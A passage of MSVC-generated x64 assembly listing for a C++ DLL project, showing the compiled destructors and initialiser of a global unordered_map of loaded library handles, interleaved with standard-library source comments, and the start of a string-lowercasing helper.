	mov	rcx, QWORD PTR ?_loadedLibs@@3V?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@A+24
	test	rcx, rcx
	je	SHORT $LN17@dynamic

; 281  :         return static_cast<size_type>(_Mypair._Myval2._Myend - _Mypair._Myval2._Myfirst);

	mov	rdx, QWORD PTR ?_loadedLibs@@3V?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@A+40
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 950  :         _STD _Deallocate<_New_alignof<_Ty>>(_Ptr, sizeof(_Ty) * _Count);

	mov	rax, rcx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash

; 281  :         return static_cast<size_type>(_Mypair._Myval2._Myend - _Mypair._Myval2._Myfirst);

	sub	rdx, rcx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 950  :         _STD _Deallocate<_New_alignof<_Ty>>(_Ptr, sizeof(_Ty) * _Count);

	and	rdx, -8

; 253  :         if (_Bytes >= _Big_allocation_threshold) {

	cmp	rdx, 4096				; 00001000H
	jb	SHORT $LN39@dynamic

; 174  :     const uintptr_t _Ptr_container   = _Ptr_user[-1];

	mov	rcx, QWORD PTR [rcx-8]
	add	rdx, 39					; 00000027H
	sub	rax, rcx

; 175  : 
; 176  :     // If the following asserts, it likely means that we are performing
; 177  :     // an aligned delete on memory coming from an unaligned allocation.
; 178  :     _STL_ASSERT(_Ptr_user[-2] == _Big_allocation_sentinel, "invalid argument");
; 179  : 
; 180  :     // Extra paranoia on aligned allocation/deallocation; ensure _Ptr_container is
; 181  :     // in range [_Min_back_shift, _Non_user_size]
; 182  : #ifdef _DEBUG
; 183  :     constexpr uintptr_t _Min_back_shift = 2 * sizeof(void*);
; 184  : #else // ^^^ defined(_DEBUG) / !defined(_DEBUG) vvv
; 185  :     constexpr uintptr_t _Min_back_shift = sizeof(void*);
; 186  : #endif // ^^^ !defined(_DEBUG) ^^^
; 187  :     const uintptr_t _Back_shift = reinterpret_cast<uintptr_t>(_Ptr) - _Ptr_container;
; 188  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

	add	rax, -8
	cmp	rax, 31
	ja	SHORT $LN101@dynamic
$LN39@dynamic:

; 258  :         ::operator delete(_Ptr, _Bytes);

	call	??3@YAXPEAX_K@Z				; operator delete
	xorps	xmm0, xmm0
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash

; 312  :             _Mypair._Myval2._Myfirst = nullptr;

	mov	QWORD PTR ?_loadedLibs@@3V?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@A+24, 0

; 313  :             _Mypair._Myval2._Mylast  = nullptr;

	movdqa	XMMWORD PTR ?_loadedLibs@@3V?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@A+32, xmm0
$LN17@dynamic:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\list

; 1503 :         _Node::_Free_non_head(_Al, _My_data._Myhead);

	mov	rdx, QWORD PTR ?_loadedLibs@@3V?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@A+8
	call	??$_Free_non_head@V?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@std@@@?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@SAXAEAV?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@1@PEAU01@@Z ; std::_List_node<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,void *>::_Free_non_head<std::allocator<std::_List_node<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,void *> > >
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 258  :         ::operator delete(_Ptr, _Bytes);

	mov	rcx, QWORD PTR ?_loadedLibs@@3V?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@A+8
	mov	edx, 56					; 00000038H
	add	rsp, 40					; 00000028H
	jmp	??3@YAXPEAX_K@Z				; operator delete
$LN101@dynamic:

; 188  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

	call	_invalid_parameter_noinfo_noreturn
	int	3
$LN99@dynamic:
??__F_loadedLibs@@YAXXZ ENDP				; `dynamic atexit destructor for '_loadedLibs''
text$yd	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\list
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
;	COMDAT ??1?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@QEAA@XZ
_TEXT	SEGMENT
this$ = 48
??1?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@QEAA@XZ PROC ; std::unordered_map<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > >::~unordered_map<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > >, COMDAT
$LN100:
	push	rbx
	sub	rsp, 32					; 00000020H
	mov	rbx, rcx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash

; 309  :         if (_Mypair._Myval2._Myfirst != nullptr) {

	mov	rcx, QWORD PTR [rcx+24]
	test	rcx, rcx
	je	SHORT $LN13@unordered_

; 281  :         return static_cast<size_type>(_Mypair._Myval2._Myend - _Mypair._Myval2._Myfirst);

	mov	rdx, QWORD PTR [rbx+40]
	sub	rdx, rcx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 950  :         _STD _Deallocate<_New_alignof<_Ty>>(_Ptr, sizeof(_Ty) * _Count);

	and	rdx, -8

; 253  :         if (_Bytes >= _Big_allocation_threshold) {

	cmp	rdx, 4096				; 00001000H
	jb	SHORT $LN35@unordered_

; 174  :     const uintptr_t _Ptr_container   = _Ptr_user[-1];

	mov	r8, QWORD PTR [rcx-8]
	add	rdx, 39					; 00000027H

; 175  : 
; 176  :     // If the following asserts, it likely means that we are performing
; 177  :     // an aligned delete on memory coming from an unaligned allocation.
; 178  :     _STL_ASSERT(_Ptr_user[-2] == _Big_allocation_sentinel, "invalid argument");
; 179  : 
; 180  :     // Extra paranoia on aligned allocation/deallocation; ensure _Ptr_container is
; 181  :     // in range [_Min_back_shift, _Non_user_size]
; 182  : #ifdef _DEBUG
; 183  :     constexpr uintptr_t _Min_back_shift = 2 * sizeof(void*);
; 184  : #else // ^^^ defined(_DEBUG) / !defined(_DEBUG) vvv
; 185  :     constexpr uintptr_t _Min_back_shift = sizeof(void*);
; 186  : #endif // ^^^ !defined(_DEBUG) ^^^
; 187  :     const uintptr_t _Back_shift = reinterpret_cast<uintptr_t>(_Ptr) - _Ptr_container;

	sub	rcx, r8

; 188  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

	lea	rax, QWORD PTR [rcx-8]
	cmp	rax, 31
	ja	SHORT $LN32@unordered_

; 189  :     _Ptr = reinterpret_cast<void*>(_Ptr_container);

	mov	rcx, r8
$LN35@unordered_:

; 258  :         ::operator delete(_Ptr, _Bytes);

	call	??3@YAXPEAX_K@Z				; operator delete
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash

; 312  :             _Mypair._Myval2._Myfirst = nullptr;

	xor	eax, eax
	mov	QWORD PTR [rbx+24], rax

; 313  :             _Mypair._Myval2._Mylast  = nullptr;

	mov	QWORD PTR [rbx+32], rax

; 314  :             _Mypair._Myval2._Myend   = nullptr;

	mov	QWORD PTR [rbx+40], rax
$LN13@unordered_:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\list

; 1503 :         _Node::_Free_non_head(_Al, _My_data._Myhead);

	mov	rdx, QWORD PTR [rbx+8]
	call	??$_Free_non_head@V?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@std@@@?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@SAXAEAV?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@1@PEAU01@@Z ; std::_List_node<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,void *>::_Free_non_head<std::allocator<std::_List_node<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,void *> > >
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 258  :         ::operator delete(_Ptr, _Bytes);

	mov	rcx, QWORD PTR [rbx+8]
	mov	edx, 56					; 00000038H
	add	rsp, 32					; 00000020H
	pop	rbx
	jmp	??3@YAXPEAX_K@Z				; operator delete
$LN32@unordered_:

; 188  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

	call	_invalid_parameter_noinfo_noreturn
	int	3
$LN97@unordered_:
??1?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@QEAA@XZ ENDP ; std::unordered_map<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > >::~unordered_map<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\list
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
;	COMDAT ??1?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@QEAA@XZ
_TEXT	SEGMENT
this$ = 48
??1?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@QEAA@XZ PROC ; std::_Hash<std::_Umap_traits<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >,0> >::~_Hash<std::_Umap_traits<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >,0> >, COMDAT
$LN94:
	push	rbx
	sub	rsp, 32					; 00000020H
	mov	rbx, rcx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash

; 309  :         if (_Mypair._Myval2._Myfirst != nullptr) {

	mov	rcx, QWORD PTR [rcx+24]
	test	rcx, rcx
	je	SHORT $LN8@Hash

; 281  :         return static_cast<size_type>(_Mypair._Myval2._Myend - _Mypair._Myval2._Myfirst);

	mov	rdx, QWORD PTR [rbx+40]
	sub	rdx, rcx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 950  :         _STD _Deallocate<_New_alignof<_Ty>>(_Ptr, sizeof(_Ty) * _Count);

	and	rdx, -8

; 253  :         if (_Bytes >= _Big_allocation_threshold) {

	cmp	rdx, 4096				; 00001000H
	jb	SHORT $LN30@Hash

; 174  :     const uintptr_t _Ptr_container   = _Ptr_user[-1];

	mov	r8, QWORD PTR [rcx-8]
	add	rdx, 39					; 00000027H

; 175  : 
; 176  :     // If the following asserts, it likely means that we are performing
; 177  :     // an aligned delete on memory coming from an unaligned allocation.
; 178  :     _STL_ASSERT(_Ptr_user[-2] == _Big_allocation_sentinel, "invalid argument");
; 179  : 
; 180  :     // Extra paranoia on aligned allocation/deallocation; ensure _Ptr_container is
; 181  :     // in range [_Min_back_shift, _Non_user_size]
; 182  : #ifdef _DEBUG
; 183  :     constexpr uintptr_t _Min_back_shift = 2 * sizeof(void*);
; 184  : #else // ^^^ defined(_DEBUG) / !defined(_DEBUG) vvv
; 185  :     constexpr uintptr_t _Min_back_shift = sizeof(void*);
; 186  : #endif // ^^^ !defined(_DEBUG) ^^^
; 187  :     const uintptr_t _Back_shift = reinterpret_cast<uintptr_t>(_Ptr) - _Ptr_container;

	sub	rcx, r8

; 188  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

	lea	rax, QWORD PTR [rcx-8]
	cmp	rax, 31
	ja	SHORT $LN27@Hash

; 189  :     _Ptr = reinterpret_cast<void*>(_Ptr_container);

	mov	rcx, r8
$LN30@Hash:

; 258  :         ::operator delete(_Ptr, _Bytes);

	call	??3@YAXPEAX_K@Z				; operator delete
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash

; 312  :             _Mypair._Myval2._Myfirst = nullptr;

	xor	eax, eax
	mov	QWORD PTR [rbx+24], rax

; 313  :             _Mypair._Myval2._Mylast  = nullptr;

	mov	QWORD PTR [rbx+32], rax

; 314  :             _Mypair._Myval2._Myend   = nullptr;

	mov	QWORD PTR [rbx+40], rax
$LN8@Hash:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\list

; 1503 :         _Node::_Free_non_head(_Al, _My_data._Myhead);

	mov	rdx, QWORD PTR [rbx+8]
	call	??$_Free_non_head@V?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@std@@@?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@SAXAEAV?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@1@PEAU01@@Z ; std::_List_node<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,void *>::_Free_non_head<std::allocator<std::_List_node<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,void *> > >
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 258  :         ::operator delete(_Ptr, _Bytes);

	mov	rcx, QWORD PTR [rbx+8]
	mov	edx, 56					; 00000038H
	add	rsp, 32					; 00000020H
	pop	rbx
	jmp	??3@YAXPEAX_K@Z				; operator delete
$LN27@Hash:

; 188  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

	call	_invalid_parameter_noinfo_noreturn
	int	3
$LN91@Hash:
??1?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@QEAA@XZ ENDP ; std::_Hash<std::_Umap_traits<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >,0> >::~_Hash<std::_Umap_traits<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >,0> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
;	COMDAT ?__autoclassinit2@?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@QEAAX_K@Z
_TEXT	SEGMENT
this$dead$ = 8
classSize$dead$ = 16
?__autoclassinit2@?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@QEAAX_K@Z PROC ; std::unordered_map<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > >::__autoclassinit2, COMDAT
	xorps	xmm0, xmm0
	movups	XMMWORD PTR ?_loadedLibs@@3V?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@A, xmm0
	movups	XMMWORD PTR ?_loadedLibs@@3V?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@A+16, xmm0
	movups	XMMWORD PTR ?_loadedLibs@@3V?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@A+32, xmm0
	movups	XMMWORD PTR ?_loadedLibs@@3V?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@A+48, xmm0
	ret	0
?__autoclassinit2@?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@QEAAX_K@Z ENDP ; std::unordered_map<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > >::__autoclassinit2
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp
;	COMDAT ?_lower@ProcessUtilities@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@V23@@Z
_TEXT	SEGMENT
$T1 = 32
__$ReturnUdt$GSCopy$ = 40
inp$GSCopy$ = 48
__$ArrayPad$ = 56
__$ReturnUdt$ = 96
inp$ = 104
